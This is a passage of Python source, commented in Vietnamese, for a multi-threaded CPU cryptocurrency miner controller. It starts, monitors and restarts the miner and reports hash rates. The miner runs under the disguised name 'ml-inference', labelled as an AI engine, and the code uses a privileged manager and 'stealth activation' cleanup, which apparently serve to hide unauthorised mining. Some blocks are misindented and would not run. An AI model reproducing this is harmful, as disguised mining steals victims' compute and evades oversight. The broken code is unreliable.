                logger.info(f"🚀 [Mining **[log]** (nhật ký)] Đã khởi chạy luồng ghi nhật ký kép cho {process_name}")
                
                # **Start simple log monitoring** (bắt đầu giám sát log đơn giản) - **remove JSON format** (loại bỏ định dạng JSON)
                mining_perf_logger.monitor_process_logs(process_name, str(miner_log_path))
                
                time.sleep(2)
                if process.poll() is not None:
                    logger.error(f"Quá trình khai thác **[CPU]** (bộ xử lý trung tâm) kết thúc sớm.")
                    
                    # **Enhanced plugin logging for failures** (ghi log plugin nâng cao cho lỗi)
                    error_details = f"PID={process.pid} EXIT_CODE={process.returncode}"
                    log_cpu_plugin_operation("PROCESS_FAILURE", f"Early termination: {error_details}", "ERROR")
                    
                    # **Simple early termination logging** (ghi log kết thúc sớm đơn giản)
                    logger.error(f"EARLY_TERMINATION: {process_name} {error_details}")
                    process = None
                else:
                    # **Success logging** (ghi log thành công)
                    success_details = f"PID={process.pid} Command={' '.join(mining_command)}"
                    log_cpu_plugin_operation("PROCESS_SUCCESS", f"Mining process started: {success_details}", "INFO")
                    
                    logger.info(f"🔍 [**[debug]** (gỡ lỗi)] Sắp trả về đối tượng tiến trình - **[PID]** (Process ID - mã định danh tiến trình): {process.pid}, Kiểu: {type(process)}")
                    return process
                    
        except Exception as e:
            logger.error(f"🔍 [**[debug]** (gỡ lỗi)] Bắt được ngoại lệ trong start_mining_process: {type(e).__name__}: {str(e)}")
            logger.error(f"Lỗi khi khởi động quá trình khai thác **[CPU]** (bộ xử lý trung tâm): {e}")
            # **Enhanced debug info** (thông tin gỡ lỗi nâng cao) cho **cả CPU và GPU failures** (lỗi cả CPU và GPU)
            logger.error(f"🔍 Chi tiết lỗi - Ngoại lệ: {type(e).__name__}: {str(e)}")
            logger.error(f"🔍 Chi tiết lỗi - Lệnh: {' '.join(mining_command)}")
            logger.error(f"🔍 Chi tiết lỗi - Lần thử: {attempt}/{retries}")
            import traceback
            logger.error(f"🔍 Chi tiết lỗi - Traceback: {traceback.format_exc()}")
            process = None
        if attempt < retries:
            logger.info(f"Đợi {delay} giây trước khi thử lại...")
            time.sleep(delay)
    logger.error(f"Không thể khởi chạy quá trình khai thác **[CPU]** (bộ xử lý trung tâm).")
    stop_event.set()
    return None

def manage_cpu_miner(privileged_mgr, max_retries: int = 5):
    """
    **DEPRECATED**: Quản lý **lifecycle** (vòng đời) của **CPU miner** (máy khai thác CPU) - 
    **Replaced by cpu_mining_thread()** (thay thế bằng cpu_mining_thread())
    
    Note: Hàm này giữ lại để **backward compatibility** (tương thích ngược)
    """
    logger.warning("⚠️ manage_cpu_miner() [deprecated] (không dùng nữa) - dùng cpu_mining_thread() thay thế")
    return
    
    # **Enhanced initial logging** (ghi log ban đầu nâng cao)
    cpu_miner_logger.info("===== BẮT ĐẦU VÒNG ĐỜI [**[CPU]** (bộ xử lý trung tâm) Miner] (tiến trình khai thác **[CPU]** (bộ xử lý trung tâm)) =====")
    cpu_miner_logger.info(f"**[PID]** (Process ID - mã định danh tiến trình) trình quản lý: {os.getpid()}")
    cpu_miner_logger.info(f"ID luồng: {threading.current_thread().ident}")
    cpu_miner_logger.info(f"Số lần thử tối đa: {max_retries}")
    cpu_miner_logger.info("=========================================")
    
    # **Notify main logger** (thông báo logger chính)
    logger.info("✅ Trình quản lý **[CPU]** (bộ xử lý trung tâm) Miner đã được khởi tạo với cơ chế ghi **[log]** (nhật ký) riêng")
    
    # **Enhanced mining loop** (vòng lặp khai thác nâng cao)
    cpu_miner_logger.info("🔄 Bắt đầu vòng lặp giám sát khai thác **[CPU]** (bộ xử lý trung tâm)...")
    
    while not stop_event.is_set() and retries < max_retries:
        with process_lock:
            if not is_mining_process_running(cpu_process):
                cpu_miner_logger.info(f"🔄 Tiến trình **[CPU]** (bộ xử lý trung tâm) chưa chạy - đang thử khởi động (lần {retries + 1}/{max_retries})")
                cpu_process = start_mining_process(cpu=True, privileged_manager=privileged_mgr)
                if not is_mining_process_running(cpu_process):
                    retries += 1
                    cpu_miner_logger.warning(f"❌ Khởi động **[CPU]** (bộ xử lý trung tâm) miner thất bại - thử lại {retries}/{max_retries}")
                    logger.warning(f"**[CPU]** (bộ xử lý trung tâm) miner khởi động thất bại, thử lại... ({retries}/{max_retries})")
                else:
                    cpu_miner_logger.info(f"✅ **[CPU]** (bộ xử lý trung tâm) miner đã khởi động thành công - **[PID]** (Process ID - mã định danh tiến trình): {cpu_process.pid if cpu_process else 'Unknown'}")
                    logger.info("✅ **[CPU]** (bộ xử lý trung tâm) miner đã khởi động thành công.")
                    retries = 0  # Reset retries on successful start
            else:
                # **Process running - log status** (tiến trình đang chạy - ghi log trạng thái)
                retries = 0
                cpu_miner_logger.debug(f"📊 **[CPU]** (bộ xử lý trung tâm) miner đang chạy ổn định - **[PID]** (Process ID - mã định danh tiến trình): {cpu_process.pid if cpu_process else 'Unknown'}")
                
                # **Log resource usage** (ghi log mức sử dụng tài nguyên)
                log_resource_usage("ml-inference")
        
        # **Wait với detailed logging** (đợi với ghi log chi tiết)
        cpu_miner_logger.debug("⏳ Chờ 30s trước chu kỳ giám sát tiếp theo")
        stop_event.wait(30)
    
    if retries >= max_retries:
        cpu_miner_logger.error(f"🚨 **[CPU]** (bộ xử lý trung tâm) miner thất bại {max_retries} lần - dừng giám sát")
        logger.error("🚨 **[CPU]** (bộ xử lý trung tâm) miner đã thất bại quá nhiều lần. Dừng giám sát.")
        stop_event.set()
    
    cpu_miner_logger.info("===== KẾT THÚC VÒNG ĐỜI [**[CPU]** (bộ xử lý trung tâm) Miner] (tiến trình khai thác **[CPU]** (bộ xử lý trung tâm)) =====")

def manage_gpu_miner(privileged_mgr, max_retries: int = 5):
    """(ĐÃ GỠ) Quản lý GPU miner không còn trong bản CPU-only."""
    logger.info("manage_gpu_miner() đã bị loại bỏ trong bản chỉ **[CPU]** (bộ xử lý trung tâm) (**[CPU]** (bộ xử lý trung tâm)-only)")
    return

# **Global Thread Communication Event Bus** (EventBus giao tiếp luồng toàn cầu)
event_bus_instance = None
event_bus_lock = threading.Lock()

def get_thread_event_bus():
    """**Thread-safe EventBus instance** (thể hiện EventBus an toàn luồng) cho **inter-thread communication** (giao tiếp giữa các luồng)"""
    global event_bus_instance
    with event_bus_lock:
        if event_bus_instance is None:
            from mining_environment.scripts.auxiliary_modules.event_bus import EventBus
            event_bus_instance = EventBus(backend_type="memory", logger=logger)
            logger.info("✅ **[thread]** (luồng) EventBus initialized successfully")
        return event_bus_instance

def environment_setup_thread():
    """**Thread 1: Environment Setup** (Luồng 1: Thiết lập môi trường) với **thread-safe operations** (thao tác an toàn luồng)"""
    thread_logger = setup_logging('env_setup_thread', str(Path(LOGS_DIR) / 'env_setup_thread.log'), 'INFO')
    thread_logger.info("🌍 Luồng Thiết lập Môi trường đã bắt đầu")
    
    try:
        # **Initialize environment** (khởi tạo môi trường) trong **isolated thread** (luồng cô lập)
        thread_logger.info("🔧 Bắt đầu khởi tạo môi trường...")
        privileged_manager = initialize_environment()
        
        # **Thread completion event** (sự kiện hoàn thành luồng) gửi tới **EventBus**
        bus = get_thread_event_bus()
        bus.publish('thread:env_setup_complete', {
            'thread_id': threading.current_thread().ident,
            'thread_name': 'EnvironmentSetup',
            'status': 'success',
            'privileged_manager': privileged_manager is not None,
            'timestamp': time.time()
        })
        
        thread_logger.info("✅ Luồng Thiết lập Môi trường hoàn tất thành công")
        return privileged_manager
        
    except Exception as e:
        thread_logger.error(f"❌ Luồng Thiết lập Môi trường thất bại: {e}")
        bus = get_thread_event_bus()
        bus.publish('thread:env_setup_failed', {
            'thread_id': threading.current_thread().ident,
            'thread_name': 'EnvironmentSetup',
            'status': 'failed',
            'error': str(e),
            'timestamp': time.time()
        })
        stop_event.set()
        return None

def cpu_mining_thread():
    """**Thread 2: CPU Mining** (Luồng 2: Khai thác CPU) với **PID tracking** (theo dõi PID) và **EventBus integration** (tích hợp EventBus)"""
    global cpu_process
    # 🔧 FIX: Sử dụng cpu_miner_logger thay vì tạo thread_logger riêng
    thread_logger = cpu_miner_logger
    thread_logger.info("⚡ Luồng Khai thác **[CPU]** (bộ xử lý trung tâm) đã bắt đầu")
    
    bus = get_thread_event_bus()
    max_retries = 5
    retries = 0
    
    # Môi trường đã được thiết lập đồng bộ trong main(); lấy privileged_manager_global
    global privileged_manager_global
    privileged_manager = privileged_manager_global
    if privileged_manager is None:
        thread_logger.error("❌ **[environment]** (môi trường) chưa sẵn sàng - dừng **[CPU]** (bộ xử lý trung tâm) mining **[thread]** (luồng)")
        stop_event.set()
        return
    
    # **CPU Mining Loop** (vòng lặp khai thác CPU) với **PID tracking** (theo dõi PID)
    while not stop_event.is_set() and retries < max_retries:
        try:
            with process_lock:
                running_status = is_mining_process_running(cpu_process)
                thread_logger.debug(f"[TRACE] is_mining_process_running={running_status}, **[PID]** (Process ID - mã định danh tiến trình)={getattr(cpu_process,'pid',None)}")
                if not running_status:
                    thread_logger.info(f"🔄 Đang khởi động tiến trình khai thác **[CPU]** (bộ xử lý trung tâm) (lần {retries + 1}/{max_retries})")
                    cpu_process = start_mining_process(cpu=True, privileged_manager=privileged_manager)
                    thread_logger.info(f"🔍 [**[debug]** (gỡ lỗi)] start_mining_process trả về: {cpu_process} (kiểu: {type(cpu_process)})")
                    if cpu_process:
                        thread_logger.info(f"🔍 [**[debug]** (gỡ lỗi)] Nhận tiến trình **[CPU]** (bộ xử lý trung tâm) thành công - **[PID]** (Process ID - mã định danh tiến trình): {cpu_process.pid}")
                        # Enhanced PID Logger: register_process đã được gọi trong start_mining_process
                        thread_logger.info(f"✅ **[PID]** (Process ID - mã định danh tiến trình) tiến trình **[CPU]** (bộ xử lý trung tâm) {cpu_process.pid} đã được đăng ký cho giám sát nâng cao")
                    else:
                        thread_logger.error(f"🔍 [**[debug]** (gỡ lỗi)] **[CPU]** (bộ xử lý trung tâm) **[process]** (tiến trình) is **[none]** (không có) - start_mining_process failed")
                    
                    if cpu_process:
                        # **EventBus PID registration** (đăng ký PID EventBus) – publish ngay, không phụ thuộc kiểm tra running**
                        thread_logger.info(f"🔍 [DIAGNOSTIC] Sắp publish cpu_pid_registered cho **[PID]** (Process ID - mã định danh tiến trình) {cpu_process.pid}")
                        try:
                            event_payload = {
                                'thread_id': threading.current_thread().ident,
                                'thread_name': 'CPUMining',
                                'pid': cpu_process.pid,
                                'process_name': 'ml-inference',
                                'status': 'running',
                                'attempt': retries + 1,
                                'timestamp': time.time()
                            }
                            thread_logger.info(f"🔍 [DIAGNOSTIC] [**[event]** (sự kiện) payload] (tải sự kiện): {event_payload}")
                            bus.publish('mining:cpu_pid_registered', event_payload)
                            thread_logger.info(f"✅ [DIAGNOSTIC] Đã publish sự kiện cpu_pid_registered thành công")
                        except Exception as e:
                            thread_logger.error(f"[EventBus] lỗi publish cpu_pid: {e}")
                        
                        # **🔧 FIX: Start process output monitoring thread** (khởi tạo luồng giám sát đầu ra tiến trình)
                        try:
                            log_file_path = f"/app/mining_environment/logs/{os.getenv('ML_PROCESS_NAME', 'ml-inference')}_output.log"
                            cpu_log_file = open(log_file_path, 'ab')  # Open file handle for monitor thread
                            monitor_thread = threading.Thread(
                                target=monitor_process_output,
                                args=(cpu_process, "CPU-AI-Engine", cpu_log_file, thread_logger),
                                daemon=True,
                                name=f"CPUMonitor-{cpu_process.pid}"
                            )
                            monitor_thread.start()
                            thread_logger.info(f"📊 Đã khởi chạy luồng giám sát output **[CPU]** (bộ xử lý trung tâm) (ID: {monitor_thread.ident})")
                        except Exception as monitor_err:
                            thread_logger.error(f"❌ Khởi chạy giám sát output **[CPU]** (bộ xử lý trung tâm) thất bại: {monitor_err}")
                        
                        thread_logger.info(f"✅ Khai thác **[CPU]** (bộ xử lý trung tâm) đã bắt đầu - **[PID]** (Process ID - mã định danh tiến trình): {cpu_process.pid}")
                        retries = 0  # Reset on success
                    else:
                        retries += 1
                        thread_logger.error(f"❌ Khởi động khai thác **[CPU]** (bộ xử lý trung tâm) thất bại (lần {retries}/{max_retries})")
                else:
                    # **Process running - periodic PID update** (tiến trình đang chạy - cập nhật PID định kỳ)
                    # bỏ heartbeat qua EventBus – chỉ ghi log nội bộ
                    thread_logger.debug("**[CPU]** (bộ xử lý trung tâm) miner nhịp tim ổn định (healthy heartbeat)")
                    
        except Exception as e:
            thread_logger.error(f"❌ Lỗi Luồng Khai thác **[CPU]** (bộ xử lý trung tâm): {e}")
            retries += 1
        
        # **Supervision interval** (khoảng thời gian giám sát)
        stop_event.wait(30)
    
    if retries >= max_retries:
    thread_logger.error(f"🚨 Khai thác **[CPU]** (bộ xử lý trung tâm) thất bại {max_retries} lần - dừng luồng")
        stop_event.set()
    
    thread_logger.info("🔚 Luồng Khai thác **[CPU]** (bộ xử lý trung tâm) đã kết thúc")

def gpu_mining_thread():
    """
    (ĐÃ GỠ) GPU mining thread đã được loại bỏ trong bản CPU-only.
    Giữ placeholder để tương thích import cũ nếu có, nhưng không thực thi.
    """
    logger.info("Luồng khai thác **[GPU]** (bộ xử lý đồ họa) đã bị loại bỏ trong bản chỉ **[CPU]** (bộ xử lý trung tâm) (**[CPU]** (bộ xử lý trung tâm)-only).")
    return

def resource_manager_thread():
    """**Thread 4: Resource Manager** (Luồng 4: Trình quản lý tài nguyên) với **EventBus integration** (tích hợp EventBus)"""
    thread_logger = setup_logging('resource_manager_thread', str(Path(LOGS_DIR) / 'resource_manager_thread.log'), 'DEBUG')
    thread_logger.info("📊 Luồng Trình quản lý Tài nguyên đã bắt đầu")
# Lấy EventBus để truyền vào ResourceManager và ghi sự kiện lỗi (chỉ mục đích nội bộ)
    bus = get_thread_event_bus()

    try:
        # **Step 1**: Load configuration
        thread_logger.info("📋 Đang nạp cấu hình ResourceManager...")
        config_path = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config')) / "resource_config.json"
        
        if not config_path.exists():
            raise FileNotFoundError(f"Configuration file not found: {config_path}")
            
        with open(config_path, 'r') as f:
            config_data = json.loads(f.read())
        
        config = ConfigModel(**config_data)
        thread_logger.info("✅ Đã nạp cấu hình ResourceManager")
        
        # **Step 2**: Initialize ResourceManager
        thread_logger.info("🔧 Đang tạo thể hiện ResourceManager...")
        resource_manager = ResourceManager(config, bus, thread_logger)
        thread_logger.info("✅ Đã tạo thể hiện ResourceManager")
        
        # **EventBus notification** (thông báo EventBus) - Resource Manager ready
        # Đã bỏ publish EventBus cho ResourceManager
        
        # **Step 3**: Start ResourceManager
        thread_logger.info("🚀 Đang khởi động ResourceManager...")
        resource_manager.start()
        thread_logger.info("🎯 ResourceManager đã khởi động thành công")
        
    except Exception as e:
        thread_logger.error(f"❌ Luồng Trình quản lý Tài nguyên thất bại: {e}")
        bus.publish('thread:resource_manager_failed', {
            'thread_id': threading.current_thread().ident,
            'thread_name': 'ResourceManager',
            'status': 'failed',
            'error': str(e),
            'timestamp': time.time()
        })
        stop_event.set()
    
    thread_logger.info("🔚 Luồng Trình quản lý Tài nguyên đã kết thúc")

def main():
    """**Multi-Threading Architecture Main Function** (hàm chính kiến trúc đa luồng) với **EventBus coordination** (phối hợp EventBus)"""
    logger.info("===== Bắt đầu hoạt động khai thác tiền điện tử (Multi-Threading Architecture) =====")
    
    # ------------------------------------------------------------------
    # 1️⃣ Thiết lập môi trường đồng bộ (loại bỏ EventBus giữa các luồng)
    # ------------------------------------------------------------------
    global privileged_manager_global
    try:
        logger.info("🔧 Đang thiết lập môi trường (synchronous)...")
        privileged_manager_global = initialize_environment()
        logger.info("✅ Thiết lập môi trường hoàn tất")
    except Exception as e:
        logger.error(f"❌ Không thể thiết lập môi trường: {e}")
        return  # Abort startup nếu môi trường lỗi

    # ------------------------------------------------------------------
    # 2️⃣ Khởi tạo EventBus cho giao tiếp PID / ResourceManager
    # ------------------------------------------------------------------
    bus = get_thread_event_bus()
    logger.info("✅ EventBus giao tiếp giữa luồng đã được khởi tạo")
    # 🚀 Khởi động PID Logger worker với error handling và verification
    try:
        from pid_logger import _WORKER_STARTED
        start_worker()
        # Verify worker đã khởi chạy thành công
        for i in range(5):  # Retry 5 lần, mỗi lần 0.5s
            if _WORKER_STARTED.is_set():
                logger.info("🚀 Worker **[PID]** (Process ID - mã định danh tiến trình) Logger đã khởi động thành công")
                break
            time.sleep(0.5)
                logger.info(f"⏳ Đang chờ worker **[PID]** (Process ID - mã định danh tiến trình) Logger khởi động... (lần {i+1}/5)")
        else:
            logger.error("❌ Worker **[PID]** (Process ID - mã định danh tiến trình) Logger khởi động thất bại sau 5 lần thử")
            # Force restart worker
            from pid_logger import force_restart_worker
            force_restart_worker()
            logger.info("🔄 Đã khởi động lại cưỡng bức worker **[PID]** (Process ID - mã định danh tiến trình) Logger")
    except Exception as e:
        logger.error(f"❌ Khởi động worker **[PID]** (Process ID - mã định danh tiến trình) Logger thất bại: {e}")
        # Fallback: try to start worker again
        try:
            start_worker()
            logger.info("🔄 Worker **[PID]** (Process ID - mã định danh tiến trình) Logger (dự phòng) đã khởi động")
        except Exception as e2:
            logger.error(f"❌ Worker **[PID]** (Process ID - mã định danh tiến trình) Logger (dự phòng) cũng thất bại: {e2}")

    # 🤖 Auto PID Registration Thread để theo dõi và đăng ký tiến trình mining
    def auto_pid_registration_thread():
        """Luồng tự động theo dõi và đăng ký tiến trình mining mới"""
        import time as time_module
        import glob
        import os
        from pid_logger import register_process, _PROCESS_REGISTRY, debug_registry_status
        
        logger.info("🤖 Luồng Đăng ký **[PID]** (Process ID - mã định danh tiến trình) Tự động đã bắt đầu")
        last_scan_pids = set()
        
        while True:
            try:
                # Scan các tiến trình ml-inference
                current_pids = set()
                
                for proc_dir in glob.glob("/proc/[0-9]*"):
                    try:
                        pid = int(proc_dir.split('/')[-1])
                        with open(f"{proc_dir}/cmdline", 'r') as f:
                            cmdline = f.read().strip()
                        
                        # Check ml-inference (CPU)
                        if "ml-inference" in cmdline and "stealth" not in cmdline:
                            current_pids.add((pid, "cpu", "ml-inference"))
                        # (CPU-only) Bỏ qua inference-cuda (GPU)
                            
                    except (OSError, IOError, ValueError):
                        continue
                
                # Đăng ký các PID mới
                new_pids = current_pids - last_scan_pids
                for pid, process_type, process_name in new_pids:
                    if pid not in _PROCESS_REGISTRY:
                        try:
                            # Sử dụng psutil để tạo real process object
                            import psutil
                            real_proc = psutil.Process(pid)
                            
                            register_process(pid, process_type, real_proc, process_name)
                            logger.info(f"🤖 Đã tự động đăng ký **[PID]** (Process ID - mã định danh tiến trình) khai thác {process_type} mới: {pid} với đối tượng tiến trình psutil thực")
                        except psutil.NoSuchProcess:
                            logger.warning(f"🤖 **[PID]** (Process ID - mã định danh tiến trình) tiến trình {pid} không còn tồn tại trong lúc đăng ký")
                        except psutil.AccessDenied:
                            logger.warning(f"🤖 Bị từ chối quyền với **[PID]** (Process ID - mã định danh tiến trình) {pid}, dùng tiến trình giả dự phòng")
                            # Fallback to fake process if access denied
                            fake_proc = type('FakeProcess', (), {
                                'poll': lambda: None if os.path.exists(f"/proc/{pid}") else 0,
                                'is_running': lambda: os.path.exists(f"/proc/{pid}")
                            })()
                            register_process(pid, process_type, fake_proc, process_name)
                            logger.info(f"🤖 Đã tự động đăng ký **[PID]** (Process ID - mã định danh tiến trình) khai thác {process_type}: {pid} với tiến trình giả dự phòng")
                        except Exception as e:
                            logger.warning(f"🤖 Đăng ký tự động thất bại cho **[PID]** (Process ID - mã định danh tiến trình) {pid}: {e}")
                
                last_scan_pids = current_pids
                
                # Debug info mỗi 30s
                if time_module.time() % 30 < 5:  # Gần như mỗi 30s
                    debug_registry_status()
                
                time_module.sleep(5)  # Scan mỗi 5 giây
                
            except Exception as e:
                logger.error(f"🤖 Lỗi Luồng Đăng ký **[PID]** (Process ID - mã định danh tiến trình) Tự động: {e}")
                time_module.sleep(10)  # Sleep dài hơn khi có lỗi
    
    # Thêm khai báo danh sách mining_threads
    mining_threads = []
    
    # Thêm Auto PID Registration Thread
    auto_pid_thread = threading.Thread(
        target=auto_pid_registration_thread,
        daemon=True,
        name="AutoPIDRegistrationThread"
    )
    mining_threads.append(('Auto PID Registration', auto_pid_thread, True))

    # (Đã bỏ EnvironmentSetupThread – môi trường thiết lập đồng bộ)

    # **Thread 4: Resource Manager** (Luồng 4: Trình quản lý tài nguyên)
    resource_thread = threading.Thread(
        target=resource_manager_thread,
        daemon=True,
        name="ResourceManagerThread"
    )
    mining_threads.append(('Resource Manager', resource_thread, True))

    # **Thread 2: CPU Mining** (Luồng 2: Khai thác CPU)
    cpu_thread = threading.Thread(
        target=cpu_mining_thread,
        daemon=True,
        name="CPUMiningThread"
    )
    mining_threads.append(('CPU Mining', cpu_thread, True))

    # (CPU-only) Không khởi tạo GPU Mining thread
    
    # **Sequential Thread Startup** (Khởi động luồng tuần tự) với **dependency management** (quản lý phụ thuộc)
    logger.info("🚀 Đang khởi động các luồng theo thứ tự phụ thuộc...")
    
    started_threads = []
    for thread_type, thread, enabled in mining_threads:
        if enabled:
            try:
                thread.start()
                started_threads.append((thread_type, thread))
                logger.info(f"✅ Luồng {thread_type} đã khởi động (ID: {thread.ident})")
                
                # **Startup delay** (độ trễ khởi động) để **sequential initialization** (khởi tạo tuần tự)
                time.sleep(1.0)
                
            except Exception as e:
                logger.error(f"❌ Khởi động luồng {thread_type} thất bại: {e}")
        else:
            logger.info(f"⏸️ Luồng {thread_type} bị vô hiệu hoá bởi cấu hình")
    
    # **Thread Health Verification** (Xác minh sức khỏe luồng) với **EventBus monitoring** (giám sát EventBus)
    logger.info("🔍 Đang xác minh tình trạng (sức khoẻ) của các luồng...")
    time.sleep(5)  # Cho phép threads khởi tạo hoàn tất
    
    # **EventBus event handlers** (theo dõi pid & resource manager)**
    thread_status = {
        'cpu_pid_registered': False
    }

    def cpu_pid_handler(payload):
        thread_status['cpu_pid_registered'] = True
        logger.info(f"✅ **[CPU]** (bộ xử lý trung tâm) Mining **[PID]** (Process ID - mã định danh tiến trình) registered: {payload['pid']}")
    
    # **Subscribe to thread events** (đăng ký sự kiện luồng)
    # chỉ dùng EventBus cho PID
    bus.subscribe('mining:cpu_pid_registered', cpu_pid_handler)
    
    active_count = sum(1 for _, thread in started_threads if thread.is_alive())
    logger.info(f"🎯 Luồng đang hoạt động: {active_count}/{len(started_threads)}")
    
    if active_count > 0:
        logger.info("🚀 Khởi động kiến trúc đa luồng đã hoàn tất")
    else:
        logger.error("❌ Không có luồng nào đang chạy - hãy kiểm tra cấu hình và logs")
        stop_event.set()
        return
    
    # **Enhanced performance monitoring thread** (luồng giám sát hiệu suất nâng cao)
    def performance_monitor():
        """
        **Real-time mining performance monitor** (giám sát hiệu suất khai thác thời gian thực) với 
        **detailed metrics** (chỉ số chi tiết) và **system resource tracking** (theo dõi tài nguyên hệ thống)
        """
        last_report_time = time.time()
        last_metrics_time = time.time()
        monitor_start_time = time.time()
        
        print(f"\033[96m🔍 TRÌNH GIÁM SÁT HIỆU SUẤT ĐÃ BẮT ĐẦU\033[0m", flush=True)
        
        while not stop_event.is_set():
            try:
                current_time = time.time()
                
                # **Enhanced real-time metrics** (chỉ số thời gian thực nâng cao) mỗi 15 giây
                if current_time - last_metrics_time >= 15:
                    metrics = get_real_time_metrics()
                    cpu_metrics = metrics.get("ml-inference", {})
                    
                    cpu_hash = cpu_metrics.get('current_hash_rate', 0)
                    total_hash = cpu_hash
                    
                    # **System resource usage** (sử dụng tài nguyên hệ thống)
                    try:
                        cpu_percent = psutil.cpu_percent(interval=1)
                        memory = psutil.virtual_memory()
                        memory_percent = memory.percent
                        
                        # **Enhanced metrics display** (hiển thị chỉ số nâng cao)
                        runtime_total = current_time - monitor_start_time
                        metrics_display = (
                            f"\033[96m📊 REAL-TIME METRICS [Runtime: {runtime_total:.0f}s]\n"
                            f"   ├─ CPU Mining: {cpu_hash:.2f} H/s\n"
                            f"   ├─ Total Hash: {total_hash:.2f} H/s\n"
                            f"   ├─ CPU Usage: {cpu_percent:.1f}%\n"
                            f"   ├─ Memory Usage: {memory_percent:.1f}%\n"
                            f"   └─ Active Processes: {len([p for p in [cpu_process] if p and p.poll() is None])}/1\033[0m"
                        )
                        
                        print(metrics_display, flush=True)
                        logger.info(f"CHỈ SỐ: CPU={cpu_hash:.2f}H/s "
                                   f"TỔNG={total_hash:.2f}H/s SYS_CPU={cpu_percent:.1f}% "
                                   f"SYS_MEM={memory_percent:.1f}% THỜI_GIAN_CHẠY={runtime_total:.0f}s")
                        
                    except Exception as sys_err:
                        logger.warning(f"⚠️ Lỗi chỉ số hệ thống: {sys_err}")
                    
                    last_metrics_time = current_time
                
                # **Detailed performance report** (báo cáo hiệu suất chi tiết) mỗi 60 giây
                if current_time - last_report_time >= 60:
                    try:
                        comparison_report = generate_performance_comparison()
                        
                        print(f"\033[95m=== BÁO CÁO HIỆU SUẤT CHI TIẾT ===\033[0m", flush=True)
                        logger.info("=== BÁO CÁO HIỆU SUẤT CHI TIẾT ===")
                        
                        for line in comparison_report.split('\n'):
                            if line.strip():
                                logger.info(line)
                                print(f"\033[95m{line}\033[0m", flush=True)
                        
                        print(f"\033[95m=== KẾT THÚC BÁO CÁO HIỆU SUẤT ===\033[0m", flush=True)
                        logger.info("=== KẾT THÚC BÁO CÁO HIỆU SUẤT ===")
                        
                        last_report_time = current_time
                        
                    except Exception as report_err:
                        logger.error(f"❌ Lỗi báo cáo hiệu suất: {report_err}")
                
                # **Process health check** (kiểm tra sức khỏe tiến trình)
                with process_lock:
                    cpu_alive = is_mining_process_running(cpu_process)
                
                if not cpu_alive:
                    logger.warning("⚠️ TẤT CẢ TIẾN TRÌNH KHAI THÁC ĐÃ DỪNG!")
                    print(f"\033[91m⚠️ ALL MINING PROCESSES STOPPED!\033[0m", flush=True)
                
                time.sleep(15)  # **Check interval** (khoảng thời gian kiểm tra)
                
            except Exception as e:
                error_msg = f"❌ Lỗi trong quá trình giám sát hiệu suất: {e}"
                logger.error(error_msg)
                print(f"\033[91m{error_msg}\033[0m", flush=True)
                time.sleep(30)
    
    # **Start performance monitoring thread** (khởi động luồng giám sát hiệu suất)
    perf_thread = threading.Thread(target=performance_monitor, daemon=True, name="PerformanceMonitor")
    perf_thread.start()
    
    # **Thread monitoring loop** (vòng lặp giám sát luồng) với **EventBus coordination** (phối hợp EventBus)
    try:
        monitoring_interval = 30  # seconds
        while not stop_event.is_set():
            # **Thread health check** (kiểm tra sức khỏe luồng)
            for thread_name, thread in started_threads:
                if not thread.is_alive():
                    logger.warning(f"⚠️ Luồng {thread_name} đã dừng")
                    
                    # **EventBus notification** (thông báo EventBus) thread failure
                    bus.publish('thread:failure_detected', {
                        'thread_name': thread_name,
                        'thread_id': thread.ident,
                        'status': 'stopped',
                        'timestamp': time.time()
                    })
            
            # **Performance monitoring** (giám sát hiệu suất) through EventBus
            bus.publish('system:health_check', {
                'active_threads': sum(1 for _, thread in started_threads if thread.is_alive()),
                'total_threads': len(started_threads),
                'system_status': 'running' if not stop_event.is_set() else 'stopping',
                'timestamp': time.time()
            })
            
            time.sleep(monitoring_interval)
            
    except KeyboardInterrupt:
        logger.info("Nhận tín hiệu KeyboardInterrupt. Đang dừng...")
        stop_event.set()
    
    # **Thread cleanup and synchronization** (dọn dẹp và đồng bộ hóa luồng)
    logger.info("🧹 Starting **[thread]** (luồng) cleanup and synchronization...")
    
    # **EventBus shutdown notification** (thông báo tắt EventBus)
    bus.publish('system:shutdown_initiated', {
        'reason': 'user_request',
        'active_threads': sum(1 for _, thread in started_threads if thread.is_alive()),
        'timestamp': time.time()
    })
    
    # **Graceful thread termination** (kết thúc luồng nhẹ nhàng) với timeout
    thread_shutdown_timeout = 10  # seconds
    for thread_name, thread in started_threads:
        if thread.is_alive():
            logger.info(f"🔄 Đang chờ luồng {thread_name} kết thúc...")
            thread.join(timeout=thread_shutdown_timeout)
            
            if thread.is_alive():
                logger.warning(f"⚠️ Luồng {thread_name} không dừng trong {thread_shutdown_timeout}s")
                bus.publish('thread:forced_termination', {
                    'thread_name': thread_name,
                    'thread_id': thread.ident,
                    'reason': 'timeout',
                    'timestamp': time.time()
                })
            else:
                logger.info(f"✅ Luồng {thread_name} đã dừng êm")
    
    # **Stop EventBus** (dừng EventBus)
    try:
        bus.stop()
        logger.info("✅ EventBus đã dừng thành công")
    except Exception as e:
        logger.error(f"❌ Lỗi khi dừng EventBus: {e}")
    
    # **Step 5**: Stealth system cleanup
    logger.info("📋 Bước 5/5: Đang dọn dẹp hệ thống kích hoạt ẩn danh...")
    try:
        cleanup_stealth_activation()
        logger.info("✅ Dọn dẹp hệ thống kích hoạt ẩn danh hoàn tất")
    except Exception as e:
        logger.error(f"❌ Lỗi dọn dẹp hệ thống kích hoạt ẩn danh: {e}")
    
    # **Cleanup** (dọn dẹp) và thoát
    logger.info("Bắt đầu quá trình dọn dẹp cuối cùng...")
    
    # **Export final performance report** (xuất báo cáo hiệu suất cuối cùng)
    try:
        final_report = generate_performance_comparison()
        logger.info("=== BÁO CÁO HIỆU SUẤT KHAI THÁC CUỐI CÙNG ===")
        for line in final_report.split('\n'):
            if line.strip():
                logger.info(line)
        logger.info("=== KẾT THÚC BÁO CÁO CUỐI CÙNG ===")
        
        # **Export to file** (xuất ra file)
        report_file = mining_perf_logger.export_performance_report()
        logger.info(f"📄 Báo cáo hiệu suất cuối cùng đã được lưu tại: {report_file}")
        
    except Exception as e:
        logger.error(f"Lỗi khi tạo báo cáo hiệu suất cuối cùng: {e}")
    
    # **Log final mining operations** (ghi nhật ký các thao tác khai thác cuối cùng)
    with process_lock:
        if cpu_process:
            log_mining_operation("ml-inference", "STOP", cpu_process.pid, 
                                {"reason": "shutdown", "uptime": time.time()})
        # (CPU-only) Không có tiến trình GPU để ghi log dừng
    
    
    # **Process cleanup with thread safety** (dọn dẹp tiến trình với an toàn luồng)
